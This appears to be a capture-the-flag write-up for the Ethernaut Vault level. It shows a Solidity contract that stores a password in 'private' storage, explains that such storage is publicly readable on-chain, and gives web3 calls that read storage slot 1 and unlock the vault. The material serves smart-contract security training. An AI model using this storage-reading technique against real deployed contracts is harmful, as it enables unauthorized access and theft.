# Ethernaut Vault Level Attack

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## Root cause
```solidity
byte32 private password;
```

The problem here is `private` does not mean secret on-chain, it just means other contracts cannot directly access the variable by name, but the value is still stored publicly in Ethereum contract storage for everyone can read.

In this contract:
```solidity
bool public locked; // storage slot 0
byte32 private password; // storage slot 1
```
## Attack plan

Step 1: Knowing `password` is stored in slot 1 in the storage, just need to get it by:
```javascript
await web3.eth.getStorageAt(contract.address, 1)
```

Step 2: Unlock the contract:
```javascript
const password = await web3.eth.getStorageAt(contract.address, 1)
await contract.unlock(password)
```

Step 3: Confirm the vault is unlock:
```javascript
await contract.locked() 
```
to see the return `false`